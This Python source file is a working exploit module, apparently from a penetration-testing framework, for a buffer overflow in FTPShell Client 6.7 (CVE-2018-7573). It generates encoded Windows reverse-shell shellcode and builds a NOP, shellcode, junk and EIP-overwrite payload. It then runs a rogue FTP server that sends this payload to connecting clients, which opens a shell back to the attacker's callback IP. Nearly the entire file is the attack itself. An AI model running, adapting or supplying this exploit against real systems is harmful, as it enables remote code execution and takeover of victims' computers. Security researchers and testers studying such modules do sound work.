#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
import time
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_ftpshell_bof_rce"
INFO['DESCRIPTION'] = "FTPShell Client 6.7 - Remote Buffer Overflow"
INFO['VENDOR'] = "http://www.ftpshell.com/"
INFO['DOWNLOAD_LINK'] = 'http://www.ftpshell.com/download.htm'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44596/']
INFO["CVE Name"] = 'CVE-2018-7573'
INFO["NOTES"] = """FTP server can send 400 characters of 'F' in conjunction with the FTP 220 response code to crash the application; after this overflow, one can run arbitrary code on the victim machine
"""

INFO['CHANGELOG'] = "08 May, 2018. Written by East team"
INFO['PATH'] = 'Exploits/General/'

OPTIONS = OrderedDict()
OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname()), dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32        
        badchars = ['\x00', '\x22', '\x0d', '\x0a']
        shellcode_type = "reverse"
        
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, self.callback_ip, port, badchars)
        shellcode = s.create_shellcode(shellcode_type, encode=ShellUtils.Constants.EncoderType.JUMPCALL_XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def run(self):
        self.args()
        self.log('')

        shellcode = self.make_sploit()
        if not shellcode:
            self.log('Shellcode not generated')
            self.finish(False)
            
        eip = "\xed\x2e\x45"
        nops = "\x90" * 40
        junk = "F" * (400 - len(nops) - len(shellcode))
        payload = nops + shellcode + junk + eip

        s = socket.socket()
        s.bind((self.callback_ip, 21))
        s.listen(1)
        
        self.log('FTPServer listening...')
        while True:
            conn, addr = s.accept()
            
            conn.send('220 FTP Server\r\n')
            self.log(conn.recv(1024))
            conn.send("331 OK\r\n")
            self.log(conn.recv(1024))
            conn.send('230 OK\r\n')
            self.log(conn.recv(1024))
            conn.send('220 "'+payload+'" is current directory\r\n')
        
        conn.close()
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()